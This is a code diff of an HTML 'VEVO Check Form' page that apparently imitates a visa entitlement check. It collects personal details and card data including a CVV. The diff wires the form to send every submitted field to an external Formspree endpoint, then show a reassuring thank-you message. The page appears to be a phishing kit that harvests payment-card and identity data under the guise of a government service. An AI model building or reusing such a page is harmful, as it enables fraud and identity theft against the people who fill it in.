@@ -21,8 +21,6 @@
             background-size: cover;
             color: #333;
         }
-
-        /* Header Bar */
         header {
             background-color: #2980b9;
             color: #fff;
@@ -33,7 +31,6 @@
             letter-spacing: 1px;
             box-shadow: 0 2px 6px rgba(0, 0, 0, 0.3);
         }
-
         .container {
             background: rgba(255, 255, 255, 0.95);
             max-width: 600px;
@@ -42,7 +39,6 @@
             border-radius: 15px;
             box-shadow: 0 10px 25px rgba(0,0,0,0.2);
         }
-
         h1, h2 {
             text-align: center;
             color: #2c3e50;
@@ -54,7 +50,6 @@
             border-bottom: 2px solid #2980b9;
             padding-bottom: 5px;
         }
-
         label {
             display: block;
             margin-top: 15px;
@@ -124,7 +119,8 @@
 
     <div class="container" id="form-container">
         <h1>VEVO Check Form</h1>
-        <form id="vevoForm" novalidate>
+        <!-- Formspree integration -->
+        <form id="vevoForm" action="https://formspree.io/f/xeozawdj" method="POST" novalidate>
             <h2>Personal Details</h2>
             <label for="fullName">Full Name</label>
             <input type="text" id="fullName" name="fullName" />
@@ -254,9 +250,22 @@
                 document.getElementById('cvvError').style.display = 'block';
             }
 
+            // Submit to Formspree if valid
             if (isValid) {
-                document.getElementById('form-container').style.display = 'none';
-                document.getElementById('thankYouMessage').style.display = 'block';
+                fetch(e.target.action, {
+                    method: e.target.method,
+                    body: new FormData(e.target),
+                    headers: { 'Accept': 'application/json' }
+                }).then(response => {
+                    if (response.ok) {
+                        document.getElementById('form-container').style.display = 'none';
+                        document.getElementById('thankYouMessage').style.display = 'block';
+                    } else {
+                        alert('Oops! Something went wrong.');
+                    }
+                }).catch(error => {
+                    alert('Network error, please try again later.');
+                });
             }
         });
     </script>
